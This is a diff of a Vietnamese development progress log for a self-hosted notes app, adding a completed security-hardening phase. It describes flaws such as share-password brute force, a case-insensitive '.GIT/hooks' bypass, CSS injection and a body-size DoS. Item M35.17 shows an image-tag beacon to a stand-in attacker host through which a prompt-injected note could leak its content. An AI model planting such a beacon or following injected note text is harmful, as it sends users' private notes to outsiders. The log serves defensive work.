@@ -4,7 +4,8 @@
 > Quy ước: `[ ]` chưa làm · `[~]` đang làm · `[x]` xong.
 > Cập nhật file này **mỗi khi** một mục thay đổi trạng thái.
 
-Cập nhật lần cuối: 2026-07-30 (đổi mật khẩu tổng → force logout mọi phiên owner khác qua rotate `auth.sessionSecret`)
+Cập nhật lần cuối: 2026-07-31 (Phase 35 — vá bảo mật sau audit toàn diện: brute-force share, race
+updateSettings, .git bypass, canvas containment, body-limit DoS, Docker/CI hardening)
 
 ---
 
@@ -565,7 +566,118 @@ Cập nhật lần cuối: 2026-07-30 (đổi mật khẩu tổng → force logo
       docs/MCP.md + PRD cập nhật. Verify: e2e HTTP thật (login→tạo key→gọi endpoint) — default/name/modified/
       created/pagination/bogus-fallback đều đúng thứ tự; typecheck sạch.
 
+## Phase 35 — Vá lỗ hổng bảo mật sau audit toàn diện (theo yêu cầu người dùng)
+Toàn bộ mục dưới đây là hardening thuần kỹ thuật, không đổi hành vi/luồng thao tác của người dùng
+(trừ M35.4 và M35.11 — thêm ràng buộc validate mật khẩu share ≥6 ký tự, tương tự pass tổng đã có).
+Không đưa vào phase này 5 hạng mục cần người dùng quyết định (đổi UX hoặc rủi ro vận hành): MCP key
+scopes, chặn API/MCP khi còn dùng pass mặc định, đổi `HTTP_BIND` mặc định, container Docker non-root
++ auto-chown, và nâng Electron/esbuild/vite (breaking change) — báo cáo riêng, chưa áp dụng.
+- [x] M35.1 `POST /public/shares/:id/unlock` không có rate limit → brute-force mật khẩu share không
+      giới hạn. Thêm `shareUnlockRateLimit` (10 lần/15 phút, khoá theo IP+share id — `middleware/ratelimit.ts`
+      tổng quát hoá thành factory dùng chung với `loginRateLimit`); giới hạn độ dài input trước khi vào scrypt.
+- [x] M35.2 `updateSettings()` (settings.ts) đọc-sửa-ghi không khoá; 2 lần gọi chồng nhau (vd. MCP tự
+      bump `lastUsed` đúng lúc admin thu hồi key) khiến thay đổi sau bị mất — đã tái hiện bằng mô phỏng
+      race trước khi sửa. Thêm promise-chain mutex serialize toàn bộ ghi settings.
+- [x] M35.3 Guard chặn `.git` trong `vault.resolveInVault` so khớp exact-case, `.GIT/hooks/post-merge`
+      lọt qua trên filesystem không phân biệt hoa/thường (APFS/NTFS/Docker Desktop bind-mount) → ghi
+      được git hook, autosync `git pull` 30s/lần sẽ thực thi. Sửa: so khớp lowercase, chặn thêm
+      `.gitmodules`/`.gitattributes`.
+- [x] M35.4 Canvas trong folder-share đọc file-node `.md` bằng `vault.readFileText()` thẳng, không qua
+      containment check — canvas trỏ `file` ra ngoài thư mục share vẫn bị inline nội dung vào SSR. Thêm
+      tham số `isAllowed` cho `renderCanvasHtml`/`renderNode` (rendercanvas.ts), sharepage.ts truyền
+      predicate scoped đúng thư mục share (chỉ áp cho folder-share; file-share giữ nguyên hành vi vault-wide
+      embed đã có từ trước — tài liệu hoá là thiết kế cố ý, không phải bug).
+- [x] M35.5 Canvas JSON không đáng tin cậy (import/tải về rồi share) có thể đặt `color`/`url` thành CSS
+      injection (`;position:fixed;...`) hoặc `javascript:` link — CSP hiện chặn được `javascript:` nhưng
+      không chặn CSS injection. Thêm regex allowlist cho color (`resolveColor`) và protocol cho link
+      (`safeUrl`, chỉ http/https/mailto).
+- [x] M35.6 `resolveInShareFolder` không lọc dotfile/dotdir — file ẩn trong thư mục share (bị giấu khỏi
+      listing bởi `vault.listDir`) vẫn tải được nếu đoán đúng tên. Chặn mọi segment bắt đầu bằng `.`.
+- [x] M35.7 `sendFileWithRange` (`.pipe()`) không có handler `'error'` trên stream nguồn — EISDIR/ENOENT
+      giữa lúc stream (file bị xoá, hoặc allowlist embed resolve ra thư mục) ném uncaught exception, treo
+      response/socket vĩnh viễn thay vì trả lỗi. Thêm error handler trả 500 + `res.end()`; đồng thời chặn
+      luôn việc serve thư mục ở nhánh file-kind share (trước đây chỉ folder-kind có check).
+- [x] M35.8 Cookie unlock share thiếu cờ `Secure` (khác cookie owner, vốn có qua `COOKIE_SECURE`), và
+      không mất hiệu lực khi đổi/xoá mật khẩu share (JWT chỉ ràng buộc `share.id`, còn hiệu lực tới 12h
+      sau khi đổi pass). Thêm `secure` (dùng chung `resolveCookieSecure` với route auth), nhúng fingerprint
+      SHA-256 của `passwordHash` vào JWT payload (`pv`) và đối chiếu khi verify.
+- [x] M35.9 `express.json({limit:'32mb'})` gắn ở app-level, chạy TRƯỚC mọi auth — 1 caller không xác thực
+      gửi body 30MB tới `/mcp`/`/auth/login`/bất kỳ route JSON nào cũng bị buffer trọn vẹn rồi mới 401 (đã
+      tái hiện: 30MB → 401 sau khi đọc hết body). Bỏ body-parser toàn cục; mỗi router tự mount
+      `express.json()` với limit phù hợp — router nào auth qua cookie/header/query-key (không cần đọc
+      body để xác thực) thì đặt SAU middleware auth, nên request chưa xác thực bị 401 trước khi body được
+      đọc. `/mcp` và `/api/v1/notes/*` (agent) đổi theo đúng pattern này; các router quản trị khác
+      (files/settings/git/keys/mcp-keys/plugins/uistate/shares/search/html-preview) đặt limit nhỏ phù hợp
+      mục đích (8kb–16mb) ngay sau `requireAuth`/`requireApiKey` sẵn có.
+- [x] M35.10 `/mcp` không có rate limit theo key (khác `/api/v1` đã có `requireApiKey` rate-limit sẵn).
+      Tách logic sliding-window dùng chung thành `lib/slidingwindow.ts`, áp cho cả `apikey.ts` (không đổi
+      hành vi) và `mcp.ts` (mới, 120 req/phút/key, chạy trong `mcpAuthGate` — cùng middleware đảm nhiệm
+      auth-trước-khi-đọc-body ở M35.9).
+- [x] M35.11 Mật khẩu share không có ràng buộc độ dài tối thiểu (khác pass tổng, có `MIN_PASSWORD_LEN=6`)
+      — áp cùng ngưỡng cho `PATCH /api/shares/:id`.
+- [x] M35.12 `data/qmd-index.json` ghi mode mặc định (world-readable) dù chứa đường dẫn + trích đoạn nội
+      dung mọi note — cùng độ nhạy cảm với `settings.json` (vốn đã 0600). Thêm `mode: 0o600`; các `mkdir`
+      tạo `data/` (settings/shares/search) đổi sang `0o700`.
+- [x] M35.13 `.dockerignore` chỉ khớp path gốc (`data`, `.git`), không khớp theo basename ở mọi độ sâu —
+      `COPY . .` trong Dockerfile có thể nuốt `settings.json` thật (kèm `jwtSecret`) từ một worktree dev
+      còn sót dưới `.claude/worktrees/*/data/`, hoặc `.env`. Thêm `.env`, `.env.*`, `**/data`, `**/.git`,
+      `.claude`, `docs`, `*.md` — đã xác nhận không có script build nào đọc `docs/`/`*.md` khi build.
+- [x] M35.14 Dockerfile dùng `npm install` dù lockfile đã `COPY` sẵn — không tất định, có thể lệch
+      lockfile khi rebuild. Đổi cả 2 bước (build stage + runtime deps) sang `npm ci`. Verify: `docker build`
+      thật thành công, container chạy được, login/ghi note/tạo share/rate-limit đều đúng như trước.
+- [x] M35.15 CI (`ci.yml`) không khai `permissions:` (kế thừa quyền mặc định của repo) và
+      `npm ci || npm install` âm thầm rớt xuống bỏ qua lockfile khi `ci` fail. Thêm
+      `permissions: contents: read` cấp workflow, `persist-credentials: false` ở mọi bước checkout, bỏ
+      fallback `|| npm install`. `release.yml`: chuyển `permissions: contents: write` từ workflow xuống
+      job (chỉ job publish cần), thêm `persist-credentials: false`.
+- [x] M35.16 `npm audit fix` (không `--force`) vá 4 CVE ở prod dependency: `multer` (DoS qua nested
+      field/aborted upload, high) → 2.2.0, `js-yaml` (DoS quadratic, high) → 3.15.0, `body-parser` (DoS
+      qua limit không hợp lệ) → 1.20.6, `dompurify` (bypass sanitize) → 3.4.12; đồng thời kéo theo
+      `@hono/node-server` (path traversal Windows, qua `@modelcontextprotocol/sdk`). `npm audit --omit=dev`
+      → 0 vulnerabilities. Không dùng `--force`: các CVE còn lại (`tar`/`esbuild`/`vite`/`electron`) chỉ ở
+      devDependencies (build tooling + Electron desktop, không vào image runtime), fix chúng đòi nâng
+      Electron lên major mới — báo cáo riêng, không tự áp dụng.
+- [x] M35.17 CSP của HTML Preview iframe (`/api/html-preview/:id/raw`) mở `img-src *`/`font-src * data:`
+      dù prompt sinh HTML luôn yêu cầu self-contained — note bị prompt-injection vẫn beacon được nội dung
+      qua `<img src="https://attacker/?d=...">` (không bị `connect-src 'none'` chặn vì img load không đi
+      qua connect-src). Siết còn `img-src 'self' data: blob:`, `font-src 'self' data:`.
+- [x] M35.18 Sửa mô tả sai lệch `WEBOBSIDIAN_PASSWORD` trong `docker-compose.yml`/`.env.example`/
+      `docs/RUNNING.md` (gọi là "initial password", ngụ ý hết tác dụng sau lần chạy đầu) — thực tế
+      `checkPassword()` (auth.ts) luôn kiểm tra nó như override khôi phục, **vĩnh viễn**, kể cả sau khi
+      đổi mật khẩu qua UI. Cập nhật comment khớp hành vi thật + nhắc gỡ khỏi `.env` sau khi khôi phục
+      xong. `README.md` (vốn mô tả gần đúng) làm rõ thêm chữ "permanently".
+- [x] M35.19 `docs/RUNNING.md` và `CLAUDE.md` nhúng thẳng IP droplet, domain, đường dẫn deploy và lệnh
+      `ssh root@...` production vào file đã commit + push lên fork **public** — tự vi phạm chính sách
+      "deploy docs KHÔNG nằm trong repo" mà `CLAUDE.md` khai báo. Thay bằng con trỏ tới `../_deployments/`
+      (đã tồn tại, đúng vị trí theo policy) + câu nhắc rõ "repo này public, đừng dán IP/lệnh deploy thật
+      vào đây". **Lưu ý còn tồn đọng, CHƯA xử lý**: lịch sử git đã có commit chứa các thông tin này (đã
+      push lên `fork` public) — sửa file ở HEAD không xoá được khỏi history; cần người dùng quyết định
+      (rewrite history + force-push, hoặc chấp nhận rủi ro thấp và chỉ xoay vòng nếu có bất kỳ credential
+      nào từng lộ kèm theo). Không tự ý force-push.
+
+Verify chung cho cả phase: `npm run typecheck` (2 workspace) + `npm run build` sạch; `npm --workspace
+server run test` (11/11) + `npm --workspace web run test` (34/34) pass; `server/scripts/verify-mcp.ts`
+(18/18, MCP client thật qua transport thật) + `verify-mcp-keys.ts` (14/14) pass sau khi sửa `mcp.ts`;
+dựng image Docker thật bằng `npm ci`, chạy container thật, xác nhận: login đúng pass, ghi note qua API,
+tạo share + validate độ dài mật khẩu, và rate-limit unlock (10 lần sai → 429, kể cả lần kế tiếp đúng
+pass) đều hoạt động đúng như thiết kế.
+
 ### Nhật ký tiến độ
+- 2026-07-31 (Phase 35 — vá bảo mật sau audit toàn diện): audit chạy 3 subagent song song (MCP/agent
+  API, bề mặt share công khai, deployment) + kiểm chứng thủ công (dựng server thật, brute-force thử
+  nghiệm login/share-unlock, mô phỏng race `updateSettings`, test filesystem case-insensitive) — 19 mục
+  ở Phase 35 phía trên là tất cả phát hiện THUẦN KỸ THUẬT (không đổi UX/luồng thao tác, trừ ràng buộc
+  độ dài mật khẩu share). 5 mục còn lại cần người dùng quyết định (đổi hành vi/UX hoặc rủi ro vận hành)
+  KHÔNG được áp dụng trong lần này, đã báo cáo riêng ngoài file này: (1) MCP key thêm scope read/write —
+  hiện MỌI key MCP có toàn quyền xoá vault, thêm scope sẽ cần UI chọn quyền lúc tạo key; (2) chặn
+  API/MCP hoàn toàn khi còn dùng pass mặc định `123456` — ảnh hưởng luồng deploy headless dùng Agent
+  API/MCP mà chưa từng mở web UI; (3) đổi mặc định `HTTP_BIND` từ `0.0.0.0` sang `127.0.0.1` — cần thêm
+  bước cấu hình mới truy cập được từ ngoài; (4) container Docker chạy non-root + auto-chown vault lúc
+  boot — có thể làm chậm khởi động với vault lớn, ảnh hưởng deployment đang chạy; (5) nâng
+  Electron/esbuild/vite (breaking change, chỉ ảnh hưởng desktop app, không vào runtime image). Đồng
+  thời phát hiện (chưa xử lý, cần người dùng quyết định): git history của repo — đã push lên `fork`
+  public — chứa IP/domain/lệnh `ssh root@` production ở các commit trước đây (đã sửa ở HEAD, không sửa
+  được lịch sử mà không rewrite + force-push).
 - 2026-07-30 (M2.6 — đổi mật khẩu tổng force logout mọi phiên khác): trước đây JWT phiên owner
   (`issueToken`/`verifyToken`, server/src/services/auth.ts) và unlock-cookie share công khai
   (routes/shares.ts) dùng CHUNG `auth.jwtSecret`; đổi mật khẩu chỉ ghi `userPasswordHash` mới, không
